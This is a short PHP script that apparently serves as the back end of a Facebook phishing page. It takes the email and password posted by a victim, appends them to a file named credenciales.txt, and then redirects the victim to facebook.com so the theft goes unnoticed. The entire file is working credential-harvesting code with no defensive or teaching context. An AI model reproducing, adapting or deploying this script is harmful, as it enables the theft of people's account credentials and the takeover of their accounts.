<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $credenciales = "Correo: $email\nContraseña: $pass\n\n";
    file_put_contents('credenciales.txt', $credenciales, FILE_APPEND);
    header("Location: https://www.facebook.com");
    exit();
}
?>
